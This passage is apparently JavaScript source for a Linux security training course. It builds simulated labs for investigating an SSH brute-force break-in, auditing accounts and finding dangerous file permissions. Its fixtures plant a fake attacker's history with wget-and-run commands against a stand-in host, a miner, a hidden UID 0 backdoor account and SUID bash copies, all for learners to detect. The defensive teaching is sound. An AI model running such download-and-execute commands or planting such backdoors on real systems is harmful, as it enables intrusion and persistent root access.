/* sudo learn — Linux track, Module 4: Linux security & DevSecOps (LX-128..136). Incident response and hardening on
   kc-web-01 with sh-sec.js: an SSH break-in to investigate, accounts and permissions to audit, a firewall, SSH
   hardening, persistence to hunt, signatures and package integrity to check, and shell scripts linted in CI.
   "Find X" answers are re-run on a differently compromised machine, so they must come from commands. */
(function () {
  "use strict";
  var T = window.LX_TRACK, H = window.ShLab.H, S = window.ShEngine, M2 = S.M2, M3 = S.M3, M4 = S.M4;
  var ex = T.ex, code = T.code;
  var K = M3.lab, sc = K.sc, sol = K.sol, call = K.call, basics = K.basics, rt = K.rt;
  var MAYA = "Maya Chen · SRE lead", DEV = "Dev Patel · Security", BEN = "Ben Okoro · Developer";
  var HOME = "/home/dev", NOW = S.NOW, DAY = S.DAY, HOUR = 3600000, MIN = 60000;
  var LABS = [];
  function ran(r, re, fn) { return r.history.some(function (e) { return re.test(e.cmd) && (!fn || fn(e)); }); }
  function idxOf(r, re, fn) { var k = -1; r.history.forEach(function (e, i) { if (re.test(e.cmd) && (!fn || fn(e))) k = i; }); return k; }
  function firstIdx(r, re, fn) { for (var i = 0; i < r.history.length; i++) if (re.test(r.history[i].cmd) && (!fn || fn(r.history[i]))) return i; return -1; }
  function allOut(e) { return e.out.concat(e.err); }
  function outHas(e, re) { return allOut(e).some(function (l) { return re.test(l); }); }
  function same(a, b) { return H.same(a, b); }
  function show(v) { return H.show(v); }
  // Expected answers for "find X" tasks come from the machine as it was at the start (before any fixes).
  function atStart(fn) { return function (c) { return fn(c.run("")); }; }
  function prove(r, wantFn, alt, o, msgNone, msgAlt) { var p = H.proves(r, wantFn, alt, o); return p.ok ? true : p.reason === "alt" ? msgAlt : msgNone; }
  function shadow(r, user) { var x = M4.table(r.sys, "/etc/shadow").filter(function (l) { return l[0] === user; })[0]; return x || null; }
  function passwdRow(c, user) { return M4.table(c.sys, "/etc/passwd").filter(function (l) { return l[0] === user; })[0] || null; }
  function groupMembers(c, g) { var x = M4.table(c.sys, "/etc/group").filter(function (l) { return l[0] === g; })[0]; return x ? (x[3] || "").split(",").filter(Boolean).sort() : []; }
  function procs(c, re) { return (c.sys.procs || []).filter(function (p) { return re.test(p.cmd); }); }
  function unitActive(c, n) { var u = c.sys.units && c.sys.units[n]; return !!u && u.rt.active === "active"; }

  /* ================================================================== scenario builders */
  function stamp(t) { return M2.ymd(t) + "T" + M2.tod(t) + "." + String(100000 + (t / 1000 % 900000)).slice(0, 6) + "+00:00"; }
  function sshLine(t, pid, msg) { return stamp(t) + " kc-web-01 sshd[" + pid + "]: " + msg; }
  var GUESSES = ["admin", "test", "oracle", "ubuntu", "postgres", "git", "root", "user", "deploy", "guest", "ftpuser", "pi"];
  function rnd(seed) { var s = seed; return function () { s = (s * 1103515245 + 12345) & 0x7fffffff; return s / 0x7fffffff; }; }
  // Failed SSH attempts: {ip: count}. Returns auth.log lines (with times) and fills btmp.
  function bruteForce(sys, fails, start, seed) {
    var r = rnd(seed || 7), ev = [], users = S.passwd(sys).map(function (u) { return u.name; });
    Object.keys(fails).forEach(function (ip, k) {
      var t = start + k * 47000;
      for (var i = 0; i < fails[ip]; i++) {
        t += 2000 + Math.floor(r() * 9000);
        var u = GUESSES[Math.floor(r() * GUESSES.length)], pid = 4100 + Math.floor(r() * 800), port = 40000 + Math.floor(r() * 20000);
        if (users.indexOf(u) < 0) { ev.push({ t: t, l: sshLine(t, pid, "Invalid user " + u + " from " + ip + " port " + port) }); ev.push({ t: t + 1500, l: sshLine(t + 1500, pid, "Failed password for invalid user " + u + " from " + ip + " port " + port + " ssh2") }); }
        else ev.push({ t: t + 1500, l: sshLine(t + 1500, pid, "Failed password for " + u + " from " + ip + " port " + port + " ssh2") });
        M4.failed(sys, users.indexOf(u) < 0 ? u : u, ip, t + 1500);
      }
    });
    return ev;
  }
  function writeAuth(sys, events) {
    var base = (M2.rd(sys, "/var/log/auth.log") || "").split("\n").filter(Boolean).map(function (l) { var m = /^(\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d)/.exec(l); return { t: m ? Date.parse(m[1] + "Z") : NOW, l: l }; });
    var all = base.concat(events).sort(function (a, b) { return a.t - b.t; });
    var n = M2.nodeAt(sys, "/var/log/auth.log"); n.content = all.map(function (e) { return e.l; }).join("\n") + "\n";
  }
  var PW_HASH = function (u) { return "$y$j9T$" + M2.hashChars(u + "-s", 22) + "$" + M2.hashChars(u + "-h", 43); };
  function setHash(sys, user, h) { var s = M4.shadowRow(sys, user); s.r[1] = h; M4.saveTable(sys, "/etc/shadow", s.rows); }
  function pubkey(seed, comment) { return "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI" + M2.hashChars("key" + seed, 43) + " " + comment; }
  var ATTACKER = "203.0.113.50", SCANNER = "198.51.100.77";
  // The break-in: brute force against SSH, then a successful password login, still connected, with a miner running.
  function breakin(o) {
    o = o || {};
    var ip = o.ip || ATTACKER, victim = o.victim || "deploy", fails = o.fails || (function () { var f = {}; f[ip] = 64; f[SCANNER] = 17; return f; })();
    return function (sys) {
      var ev = bruteForce(sys, fails, Date.UTC(2026, 10, 11, 2, 41, 0), o.seed || 11);
      var t = Date.UTC(2026, 10, 11, 3, 12, 44);
      setHash(sys, victim, PW_HASH(victim));
      var uid = S.uidOf(sys, victim);
      ev.push({ t: t, l: sshLine(t, 4987, "Accepted password for " + victim + " from " + ip + " port 50122 ssh2") });
      ev.push({ t: t + 20, l: sshLine(t + 20, 4987, "pam_unix(sshd:session): session opened for user " + victim + "(uid=" + uid + ") by " + victim + "(uid=0)") });
      writeAuth(sys, ev);
      M4.login(sys, victim, "pts/1", ip, t, null);
      M2.spawn(sys, { pid: 3311, ppid: 4987, uid: uid, cmd: "-bash", comm: "bash", tty: "pts/1", stat: "Ss+", start: t + 1000, cpuSecs: 1 });
      M2.spawn(sys, { pid: 3340, ppid: 1, uid: uid, cmd: "/tmp/.k/kworker-upd --pool " + ip + ":3333", comm: "kworker-upd", stat: "RN", cpu: 88.4, cpuSecs: 17800, start: t + 140000 });
      var home = S.userByName(sys, victim).home;
      M2.putRoot(sys, home + "/.bash_history", ["id", "uname -a", "cat /etc/passwd", "sudo -l", "wget -q http://" + ip + "/k.sh -O /tmp/.k.sh", "bash /tmp/.k.sh", "ps aux | grep kworker", "crontab -l"].join("\n") + "\n", 384, uid, S.gidOf(sys, victim));
      M2.mkdirRoot(sys, "/tmp/.k", 509, uid, S.gidOf(sys, victim));
      M2.putRoot(sys, "/tmp/.k.sh", "#!/bin/bash\n# (attacker's dropper, kept as evidence)\n", 509, uid, S.gidOf(sys, victim));
      M2.putRoot(sys, "/tmp/.k/kworker-upd", "\x7fELF:kworker-upd (simulated binary)\n", 493, uid, S.gidOf(sys, victim));
      sys.breakin = { ip: ip, victim: victim, fails: fails };
    };
  }

  /* ================================================================== LX-128 Investigating a break-in */
  function failCounts(c) {
    var n = {};
    (c.read("/var/log/auth.log") || "").split("\n").forEach(function (l) { var m = /Failed password.* from ([\d.]+) port/.exec(l); if (m) n[m[1]] = (n[m[1]] || 0) + 1; });
    return Object.keys(n).sort(function (a, b) { return n[b] - n[a]; }).map(function (ip) { return n[ip] + " " + ip; });
  }
  function acceptedFrom(c, ip) { return (c.read("/var/log/auth.log") || "").split("\n").filter(function (l) { return /Accepted /.test(l) && l.indexOf(" from " + ip + " ") >= 0; }); }
  var ALT_BREAKIN = { system: breakin({ ip: "192.0.2.211", victim: "ana", fails: { "192.0.2.211": 41, "198.51.100.9": 23, "203.0.113.200": 6 }, seed: 29 }) };
  LABS.push({
    id: "lx-128", n: 28, module: 4, ticket: "LX-128", xp: 150,
    title: "Investigating a break-in",
    topic: "auth.log, last, who, lastb",
    from: DEV,
    story: "<p>03:40 alert: kc-web-01 is pegged at 100% CPU and talking to an unknown address on port 3333, the classic sign of a <b>crypto miner</b>. Someone got in. Work out how, as who, and from where, see what they did, then cut them off. Don't delete anything yet: the evidence comes first.</p>",
    learn:
      "<h3>Where Linux records logins</h3>" +
      '<table class="t"><tr><th>Source</th><th>What\'s in it</th><th>Read it with</th></tr><tr><td><code>/var/log/auth.log</code></td><td>every SSH attempt, good and bad, every sudo, every su</td><td><code>grep</code>, <code>less</code> (the adm group can read it)</td></tr><tr><td><code>/var/log/wtmp</code></td><td>successful logins and how long they lasted</td><td><code>last</code></td></tr><tr><td><code>/var/log/btmp</code></td><td>failed logins</td><td><code>sudo lastb</code></td></tr><tr><td>live sessions</td><td>who is on <b>right now</b></td><td><code>who</code>, <code>w</code></td></tr></table>' +
      "<h3>Reading auth.log</h3><p>An SSH brute force leaves a wall of these:</p>" +
      code("2026-11-11T02:41:09.… kc-web-01 sshd[4210]: Invalid user admin from 203.0.113.50 port 51234\n2026-11-11T02:41:10.… kc-web-01 sshd[4210]: Failed password for invalid user admin from 203.0.113.50 port 51234 ssh2\n2026-11-11T03:12:44.… kc-web-01 sshd[4987]: Accepted password for deploy from 203.0.113.50 port 50122 ssh2") +
      "<p>The pipeline from Module 1 turns it into a ranking. <code>grep -o</code> prints only the matching part:</p>" +
      ex("grep 'Failed password' /var/log/auth.log | grep -oE 'from [0-9.]+' | sort | uniq -c | sort -rn") +
      "<p>The important line is the one that says <b>Accepted</b>: it tells you which account fell, how (<code>password</code> or <code>publickey</code>) and from which address.</p>" +
      "<h3>Sessions</h3>" + ex("last -n 5") + ex("who") +
      "<p><code>last</code> lists logins newest first; <i>still logged in</i> means the session is open now. <code>w</code> adds what each session is running.</p>" +
      "<h3>What did they do?</h3><p>Look at the account's shell history (<code>~/.bash_history</code>, readable with sudo), its processes (<code>ps -u USER</code>), and recently changed files. Attackers often clear the history, so absence of evidence isn't evidence of absence.</p>" +
      "<h3>Containment</h3><p>Two separate doors to close: the <b>password</b> (<code>passwd -l</code> puts a <code>!</code> in front of the hash) and <b>everything else</b>, like SSH keys the attacker may have added. Expiring the account blocks all logins, keys included:</p>" +
      code("sudo passwd -l deploy           # password logins blocked\nsudo usermod -e 1 deploy         # account expired: no login of any kind\nsudo pkill -KILL -u deploy       # end their session and processes") +
      '<div class="callout">Order matters: lock first, then kill the session. Kill first and they can simply log in again.</div>',
    files: {},
    system: breakin(),
    starter: "",
    objectives: [
      {
        id: "count", text: "Count the failed SSH password attempts <b>per source IP</b>, busiest first (like <code>     64 203.0.113.50</code>).",
        hints: ["grep 'Failed password', keep just the IP, then sort | uniq -c | sort -rn.", "grep 'Failed password' /var/log/auth.log | grep -oE 'from [0-9.]+' | awk '{print $2}' | sort | uniq -c | sort -rn"],
        check: function (r) { return prove(r, atStart(failCounts), ALT_BREAKIN, { norm: true }, "Count the Failed password lines per IP, busiest first (grep ... | sort | uniq -c | sort -rn). Just the count and the IP on each line.", "On another compromised server your command gave the wrong counts: compute them from the log."); }
      },
      {
        id: "accepted", text: "Show the <b>successful</b> login(s) from the IP with the most failures: which account did they get into, and how?",
        hints: ["Successful SSH logins say Accepted. Filter for the attacker's IP too.", "grep Accepted /var/log/auth.log | grep 203.0.113.50"],
        check: function (r) { return prove(r, atStart(function (c) { return acceptedFrom(c, c.sys.breakin.ip); }), { system: breakin({ victim: "ana", seed: 5 }) }, null, "Print just the Accepted line(s) for 203.0.113.50 from /var/log/auth.log.", "On a server where the same attacker got into a different account, your command didn't print that Accepted line: filter the log, don't type the answer."); }
      },
      {
        id: "sessions", text: "Use <code>last</code> and <code>who</code> to confirm the attacker's session is <b>still open</b>.",
        hints: ["last shows 'still logged in'; who lists the open sessions with the address in brackets.", "last -n 5\nwho"],
        check: function (r) {
          var l = ran(r, /^\s*(sudo\s+)?last\b/, function (e) { return outHas(e, /^deploy\s+pts\/1\s+203\.0\.113\.50.*still logged in/); });
          var w = ran(r, /^\s*(who|w)\b/, function (e) { return outHas(e, /^deploy\s+pts\/1.*203\.0\.113\.50/); });
          return l && w ? true : !l ? "Run last (it lists deploy's session from 203.0.113.50 as still logged in)." : "Now run who (or w) to see the open sessions.";
        }
      },
      {
        id: "history", text: "Find out what they ran: show deploy's shell history, and the attacker's process.",
        hints: ["~deploy/.bash_history belongs to deploy: read it with sudo. ps -u deploy lists their processes.", "sudo cat /home/deploy/.bash_history\nps -u deploy -o pid,cmd"],
        check: function (r) {
          var h = ran(r, /bash_history/, function (e) { return outHas(e, /wget -q http:\/\/203\.0\.113\.50\/k\.sh/); });
          var p = ran(r, /\b(ps|pgrep|top)\b/, function (e) { return outHas(e, /kworker-upd/); });
          return h && p ? true : !h ? "Show /home/deploy/.bash_history (sudo cat): it shows the download." : "Show deploy's processes (ps -u deploy, or ps aux | grep deploy): one is the miner.";
        }
      },
      {
        id: "contain", text: "Contain it: lock deploy's password <b>and</b> expire the account, <b>then</b> end every deploy process.",
        hints: ["sudo passwd -l deploy and sudo usermod -e 1 deploy (or chage -E 0), then sudo pkill -KILL -u deploy.", "sudo passwd -l deploy\nsudo usermod -e 1 deploy\nsudo pkill -KILL -u deploy"],
        check: function (r) {
          var s = shadow(r, "deploy");
          if (!s || s[1].charAt(0) !== "!") return "deploy's password isn't locked yet (passwd -l).";
          if (s[7] === "" || +s[7] > Math.floor(r.sys.now / DAY)) return "Locking the password doesn't stop SSH keys. Expire the account too: sudo usermod -e 1 deploy (or chage -E 0 deploy).";
          if (procs(r, /./).some(function (p) { return p.uid === 1003; })) return "deploy still has processes running (the miner and the attacker's shell): sudo pkill -KILL -u deploy.";
          var lock = firstIdx(r, /passwd\s+-l\b.*deploy|usermod\b.*(-L|-e)\b.*deploy|chage\b.*-E\b.*deploy/), kill = firstIdx(r, /\b(pkill|kill|killall)\b/, function (e) { return /-u\s+deploy|\b(3311|3340)\b/.test(e.cmd); });
          return lock >= 0 && kill > lock ? true : "Lock the account first, then end the processes: killed first, the attacker could just log back in. Reset and redo it in that order.";
        }
      }
    ],
    solution: sol("grep 'Failed password' /var/log/auth.log | grep -oE 'from [0-9.]+' | awk '{print $2}' | sort | uniq -c | sort -rn",
      "grep Accepted /var/log/auth.log | grep 203.0.113.50", "last -n 5", "who",
      "sudo cat /home/deploy/.bash_history", "ps -u deploy -o pid,cmd",
      "sudo passwd -l deploy", "sudo usermod -e 1 deploy", "sudo pkill -KILL -u deploy", "who"),
    debrief: "<p>The story the logs told: 64 password guesses from 203.0.113.50 over half an hour, one success at 03:12 against <b>deploy</b>, an account that should never have had a password at all (it's for CI, which uses keys). The attacker downloaded a script and started a miner that phones home to the same address.</p><p>Locked, expired and disconnected, in that order. But they had root-equivalent time on the box: before trusting it again you need to check accounts, permissions, and anything they left behind to get back in. That's the next tickets.</p>",
    realworld: "On any internet-facing server, run grep 'Failed password' /var/log/auth.log | wc -l: within hours of going online, every server gets brute-forced. That's why password logins over SSH should be off (lab LX-132).",
    quiz: [
      { q: "Which auth.log line proves the attacker got in?", options: ["Invalid user admin from ...", "Failed password for root from ...", "Accepted password for deploy from ...", "Connection closed by ..."], answer: 2, why: "Accepted means authentication succeeded." },
      { q: "<code>passwd -l deploy</code> alone stops...", options: ["every login", "password logins, but not SSH key logins", "only sudo", "nothing until reboot"], answer: 1, why: "It locks the password hash. Expire the account (usermod -e 1) to block keys too." },
      { q: "Why lock the account <b>before</b> killing the session?", options: ["pkill needs a locked account", "Otherwise the attacker can log straight back in", "It's quicker", "The order doesn't matter"], answer: 1, why: "Close the door, then remove the intruder." }
    ]
  });

  /* ================================================================== LX-129 Accounts */
  function accountsScenario(o) {
    o = o || {};
    var back = o.backdoor || "sysbackup", empty = o.empty || "tempuser", contractor = o.contractor || "contractor-li", extraSudo = o.extraSudo || "ben";
    return function (sys) {
      M4.addUser(sys, empty, { hash: "", gecos: "temporary test account", lastchg: Math.floor(NOW / DAY) - 200 });
      M4.addUser(sys, contractor, { gecos: "Li Wei (contractor)" });
      M4.addUser(sys, back, { uid: 0, gid: 0, home: "/var/lib/" + back, shell: "/bin/bash", gecos: "", mkhome: false });
      M2.mkdirRoot(sys, "/var/lib/" + back, 448, 0, 0);
      // hide the backdoor in the middle of /etc/passwd
      var pw = M4.table(sys, "/etc/passwd"), b = pw.filter(function (r) { return r[0] === back; })[0];
      pw = pw.filter(function (r) { return r !== b; }); pw.splice(9, 0, b); M4.saveTable(sys, "/etc/passwd", pw);
      M4.setGroupMembers(sys, "sudo", function (m) { return m.concat(["ana", extraSudo]); });
      M2.putRoot(sys, "/etc/sudoers.d/91-" + contractor, "# temporary access for the migration project\n" + contractor + " ALL=(ALL) NOPASSWD: ALL\n", 288);
      sys.accounts = { back: back, empty: empty, contractor: contractor, extraSudo: extraSudo };
    };
  }
  var ALT_ACC = { system: accountsScenario({ backdoor: "svc-sync", empty: "olduser", contractor: "contractor-mo", extraSudo: "deploy" }) };
  function uid0(c) { return M4.table(c.sys, "/etc/passwd").filter(function (r) { return r[2] === "0"; }).map(function (r) { return r[0]; }); }
  function emptyPw(c) { return M4.table(c.sys, "/etc/shadow").filter(function (r) { return r[1] === ""; }).map(function (r) { return r[0]; }); }
  LABS.push({
    id: "lx-129", n: 29, module: 4, ticket: "LX-129", xp: 150,
    title: "Accounts",
    topic: "/etc/passwd, /etc/shadow, sudo audit",
    from: DEV,
    story: "<p>After a compromise you can't trust the account list. Audit kc-web-01's accounts against the policy: <b>only root has UID 0</b>, <b>no account without a password</b>, <b>only dev and ana may use sudo</b>, and contractors lose access when their contract ends (Li's ended yesterday, 2026-11-10).</p>",
    learn:
      "<h3>/etc/passwd: who exists</h3>" + ex("grep -E '^(root|dev):' /etc/passwd") +
      "<p>Seven fields separated by <code>:</code>: name, <code>x</code> (the password is in shadow), <b>UID</b>, GID, description, home, shell. <b>UID 0 is root</b>, whatever the name says: an extra UID 0 account is a backdoor with a friendly name.</p>" +
      ex("awk -F: '$3 == 0 {print $1}' /etc/passwd") +
      "<h3>/etc/shadow: passwords and expiry</h3><p>Readable by root only. Field 2 is the password hash: <code>$y$...</code> (yescrypt) is a real password, <code>!</code> or <code>*</code> means locked or no password login, and <b>empty means no password at all</b>. Field 8 is the account's expiry day.</p>" +
      code("sudo awk -F: '$2 == \"\" {print $1}' /etc/shadow") +
      "<h3>Who can sudo?</h3><p>Two places grant it: membership of the <code>sudo</code> group, and rules in <code>/etc/sudoers</code> and <code>/etc/sudoers.d/</code>. Check both, and ask sudo itself per user:</p>" +
      ex("getent group sudo") + code("sudo ls -l /etc/sudoers.d/\nsudo -l -U ben") +
      "<h3>Fixing accounts</h3>" + code("sudo userdel -r NAME              # delete (and its home)\nsudo passwd -l NAME               # lock its password\nsudo gpasswd -d NAME sudo         # take it out of a group\nsudo usermod -e 2026-11-10 NAME   # account expires on that day\nsudo chage -l NAME                # show the dates") +
      "<p><code>userdel</code> refuses to delete a user that still has processes running: <code>-f</code> forces it. Remove a sudoers.d file with <code>sudo rm</code>.</p>",
    files: {},
    system: accountsScenario(),
    starter: "",
    objectives: [
      {
        id: "uid0", text: "List every account with <b>UID 0</b> (just the names).",
        hints: ["UID is field 3 of /etc/passwd. awk -F: can test it.", "awk -F: '$3 == 0 {print $1}' /etc/passwd"],
        check: function (r) { return prove(r, atStart(uid0), ALT_ACC, null, "Print the names of all UID 0 accounts from /etc/passwd, one per line (awk -F: ... ).", "On another server your command didn't find that server's UID 0 accounts: let the command find them."); }
      },
      {
        id: "empty", text: "List the accounts with an <b>empty password field</b> in /etc/shadow.",
        hints: ["Field 2 of /etc/shadow; only root can read it.", "sudo awk -F: '$2 == \"\" {print $1}' /etc/shadow"],
        check: function (r) { return prove(r, atStart(emptyPw), ALT_ACC, null, "Print the names whose shadow password field is empty (sudo awk -F: ... /etc/shadow).", "On another server your command didn't print that server's passwordless accounts."); }
      },
      {
        id: "fixacc", text: "Delete the backdoor account (with its home folder) and lock <code>tempuser</code>'s password.",
        hints: ["userdel refuses: UID 0 is root, and root has processes. -f forces it.", "sudo userdel -r -f sysbackup\nsudo passwd -l tempuser"],
        check: function (r) {
          if (passwdRow(r, "sysbackup")) return "sysbackup still exists (sudo userdel -r -f sysbackup: it shares root's UID, so userdel thinks it's busy).";
          if (!passwdRow(r, "root") || passwdRow(r, "root")[2] !== "0") return "Careful: root must still exist with UID 0.";
          if (r.exists("/var/lib/sysbackup")) return "Remove its home folder too (-r).";
          var s = shadow(r, "tempuser");
          return s && /^!/.test(s[1]) ? true : "tempuser can still log in without a password: lock it (sudo passwd -l tempuser).";
        }
      },
      {
        id: "sudo", text: "Make the sudo access match the policy (only dev and ana), and confirm with <code>sudo -l -U</code> that ben and contractor-li can't use sudo.",
        hints: ["getent group sudo shows ben; ls /etc/sudoers.d shows a contractor rule.", "sudo gpasswd -d ben sudo\nsudo rm /etc/sudoers.d/91-contractor-li\nsudo -l -U ben\nsudo -l -U contractor-li"],
        check: function (r) {
          if (!same(groupMembers(r, "sudo"), ["ana", "dev"])) return "The sudo group should be exactly dev and ana (it's " + show(groupMembers(r, "sudo")) + ").";
          if (r.exists("/etc/sudoers.d/91-contractor-li")) return "/etc/sudoers.d/91-contractor-li still gives contractor-li full sudo.";
          var a = ran(r, /sudo\s+-l\s+-U\s+ben|sudo\s+-U\s+ben\s+-l/, function (e) { return outHas(e, /not allowed to run sudo/); }), b = ran(r, /-U\s+contractor-li/, function (e) { return outHas(e, /not allowed to run sudo/); });
          return a && b ? true : "Confirm with sudo -l -U ben and sudo -l -U contractor-li (both should say not allowed).";
        }
      },
      {
        id: "expire", text: "Li's contract ended yesterday: make <code>contractor-li</code> expire on <b>2026-11-10</b>, then show the account's dates with <code>chage -l</code>.",
        hints: ["usermod -e or chage -E take a date YYYY-MM-DD.", "sudo usermod -e 2026-11-10 contractor-li\nsudo chage -l contractor-li"],
        check: function (r) {
          var s = shadow(r, "contractor-li");
          if (!s) return "contractor-li should still exist (expired, not deleted: you may need its files).";
          if (s[7] !== String(Math.floor(Date.UTC(2026, 10, 10) / DAY))) return "contractor-li's account should expire on 2026-11-10.";
          return ran(r, /chage\s+-l\s+contractor-li/, function (e) { return outHas(e, /Account expires\s*: Nov 10, 2026/); }) ? true : "Show it: sudo chage -l contractor-li";
        }
      }
    ],
    solution: sol("awk -F: '$3 == 0 {print $1}' /etc/passwd", "sudo awk -F: '$2 == \"\" {print $1}' /etc/shadow",
      "sudo userdel -r sysbackup", "sudo userdel -r -f sysbackup", "sudo passwd -l tempuser",
      "getent group sudo", "sudo ls -l /etc/sudoers.d/", "sudo gpasswd -d ben sudo", "sudo rm /etc/sudoers.d/91-contractor-li", "sudo -l -U ben", "sudo -l -U contractor-li",
      "sudo usermod -e 2026-11-10 contractor-li", "sudo chage -l contractor-li"),
    debrief: "<p>Three classic findings: a second root hiding as <i>sysbackup</i> (UID 0 is what counts, not the name), an account anyone could log into with no password, and sudo granted in two different places, a group and a sudoers.d file. The contractor is expired rather than deleted, so their files and audit trail survive.</p><p>Next: files with dangerous permissions, the other way attackers stay root.</p>",
    realworld: "Lynis (sudo apt install lynis; sudo lynis audit system) runs these account checks and many more. CIS benchmarks list them as controls: \"ensure root is the only UID 0 account\", \"ensure password fields are not empty\".",
    quiz: [
      { q: "An account <code>backup:x:0:0::/var/lib/backup:/bin/bash</code> is...", options: ["a normal backup account", "a second root account", "a locked account", "a system account with no rights"], answer: 1, why: "UID 0 has root's power whatever it's called." },
      { q: "In /etc/shadow, an <b>empty</b> second field means...", options: ["the account is locked", "the password hash is hidden", "no password: anyone can log in as it (where empty passwords are allowed)", "the account expired"], answer: 2, why: "Locked accounts have ! or *. Empty means nothing to type." },
      { q: "<code>usermod -G sudo ana</code> (without -a)...", options: ["adds ana to sudo", "replaces all of ana's extra groups with just sudo", "removes ana from sudo", "fails"], answer: 1, why: "Without -a, -G sets the whole list. Use usermod -aG to add." }
    ]
  });

  /* ================================================================== LX-130 Dangerous permissions */
  var BASH_BIN = "\x7fELF:bash (simulated binary)\n";
  function permsScenario(o) {
    o = o || {};
    return function (sys) {
      M2.putRoot(sys, o.suid1 || "/usr/local/bin/backup-helper", BASH_BIN, 2541, 0, 0, NOW - 3 * DAY);
      M2.mkdirRoot(sys, (o.suid2 || "/tmp/.cache/.sh").replace(/\/[^/]+$/, ""), 511, 1003, 1003);
      M2.putRoot(sys, o.suid2 || "/tmp/.cache/.sh", BASH_BIN, 2541, 0, 0, NOW - DAY);
      M2.mkdirRoot(sys, "/etc/kestrel", 493);
      M2.putRoot(sys, o.ww1 || "/etc/kestrel/app.env", "DB_HOST=10.0.1.30\nDB_USER=kestrel\nDB_PASSWORD=" + "kc_" + "db_" + "2026" + "\n", 438, 0, 33);
      M2.mkdirRoot(sys, "/opt/kestrel", 493);
      M2.putRoot(sys, o.ww2 || "/opt/kestrel/deploy.sh", "#!/bin/bash\n# run by root's cron every night\ncd /var/www/kestrel && git pull -q\n", 511, 0, 0);
      M2.putRoot(sys, "/etc/cron.d/kestrel-deploy", "15 2 * * * root /opt/kestrel/deploy.sh\n", 420);
      M2.putRoot(sys, o.ww3 || "/var/www/kestrel/robots.txt", "User-agent: *\nDisallow: /admin\n", 438, 33, 33);
      M2.mkdirRoot(sys, "/srv/shared", 511, 0, 0);
      M2.putRoot(sys, "/srv/shared/ana-notes.txt", "Q4 plan\n", 436, 1001, 1001);
      M2.putRoot(sys, "/srv/shared/ben-todo.txt", "fix the cache\n", 436, 1002, 1002);
      sys.perms = o;
    };
  }
  var ALT_PERMS = { system: permsScenario({ suid1: "/usr/local/sbin/net-helper", suid2: "/var/tmp/.fonts/.x", ww1: "/etc/kestrel/mail.conf", ww2: "/opt/kestrel/sync.sh", ww3: "/var/www/kestrel/sitemap.xml" }) };
  function suidList(c) { var res = []; (function walk(path, n) { if (n.type === "d") { Object.keys(n.children).sort(S.sortNames).forEach(function (k) { if (path === "/" && (k === "proc" || k === "sys")) return; walk((path === "/" ? "" : path) + "/" + k, n.children[k]); }); } else if (n.type === "f" && (n.mode & 2048)) res.push(path); })("/", c.sys.root); return res; }
  function worldW(c) { var res = []; ["/etc", "/opt", "/var/www"].forEach(function (top) { (function walk(path, n) { if (!n) return; if (n.type === "d") Object.keys(n.children).sort(S.sortNames).forEach(function (k) { walk(path + "/" + k, n.children[k]); }); else if (n.type === "f" && (n.mode & 2)) res.push(path); })(top, M2.nodeAt(c.sys, top)); }); return res; }
  LABS.push({
    id: "lx-130", n: 30, module: 4, ticket: "LX-130", xp: 150,
    title: "Dangerous permissions",
    topic: "SUID, world-writable files, the sticky bit",
    from: DEV,
    story: "<p>Root access can hide in a single permission bit. Sweep kc-web-01 for the three classic problems: <b>SUID programs</b> that hand out root, files <b>anyone can change</b> (including one root runs every night), and a shared folder where users can delete each other's files.</p>",
    learn:
      "<h3>SUID: run as the file's owner</h3>" + ex("ls -l /usr/bin/passwd") +
      "<p>The <code>s</code> where the owner's <code>x</code> would be is the <b>SUID</b> bit (mode 4000): the program runs as its <b>owner</b>, here root, whoever starts it. <code>passwd</code> needs that to write /etc/shadow. A SUID copy of a <b>shell</b> owned by root is an instant root shell for anyone: attackers love leaving one behind.</p>" +
      code("sudo find / -perm -4000 -type f 2>/dev/null") +
      "<p><code>-perm -4000</code> means \"has at least these bits\". Compare the list with what a stock Ubuntu has (sudo, su, passwd, mount...). To check what an odd one really is, compare it with the original: <code>sha256sum FILE /usr/bin/bash</code>. Remove the bit with <code>chmod u-s FILE</code>.</p>" +
      "<h3>World-writable</h3><p>The last <code>w</code> (others, mode 002) lets <b>every</b> user change a file. On a config with a password, or a script root runs, that's a privilege escalation.</p>" +
      code("sudo find /etc /opt /var/www -type f -perm -o+w") +
      "<p>Fix with <code>chmod o-w</code>; for secrets also <code>o-r</code> (e.g. <code>chmod 640</code>: owner read/write, group read, others nothing).</p>" +
      "<h3>The sticky bit</h3>" + ex("ls -ld /tmp") +
      "<p>The <code>t</code> at the end (mode 1000) on a shared folder means you can only delete <b>your own</b> files in it, even though everyone can write there. /tmp has it; shared folders you create need it too: <code>chmod +t DIR</code>.</p>",
    files: {},
    system: permsScenario(),
    starter: "",
    objectives: [
      {
        id: "suid", text: "List every <b>SUID</b> file on the whole system.",
        hints: ["find from / with -perm -4000; hide the permission errors.", "sudo find / -perm -4000 -type f 2>/dev/null"],
        check: function (r) { return prove(r, atStart(suidList), ALT_PERMS, { anyOrder: true }, "List every file with the SUID bit, searching from / (sudo find / -perm -4000 -type f 2>/dev/null).", "On another server your command missed that server's SUID files: search the whole system."); }
      },
      {
        id: "same", text: "Two of them aren't standard. Prove they're copies of <b>bash</b> by comparing checksums.",
        hints: ["sha256sum takes several files: equal hashes mean identical content.", "sudo sha256sum /usr/local/bin/backup-helper /tmp/.cache/.sh /usr/bin/bash"],
        check: function (r) { return ran(r, /\b(sha256sum|md5sum|sha1sum|cmp)\b/, function (e) { return /backup-helper/.test(e.cmd) && /\/tmp\/\.cache\/\.sh/.test(e.cmd) && /bash/.test(e.cmd); }) ? true : "Checksum backup-helper, /tmp/.cache/.sh and /usr/bin/bash in one command and compare."; }
      },
      {
        id: "fixsuid", text: "Remove the SUID bit from <code>/usr/local/bin/backup-helper</code> and delete <code>/tmp/.cache/.sh</code>.",
        hints: ["chmod u-s removes the bit.", "sudo chmod u-s /usr/local/bin/backup-helper\nsudo rm /tmp/.cache/.sh"],
        check: function (r) {
          var n = r.node("/usr/local/bin/backup-helper");
          if (!n) return "Keep backup-helper (the backup team uses it): just remove its SUID bit.";
          if (n.mode & 2048) return "backup-helper still has its SUID bit (chmod u-s).";
          return r.exists("/tmp/.cache/.sh") ? "Delete /tmp/.cache/.sh." : true;
        }
      },
      {
        id: "world", text: "List the <b>world-writable</b> files under /etc, /opt and /var/www, then fix them: no write for others, and <code>/etc/kestrel/app.env</code> not readable by others either.",
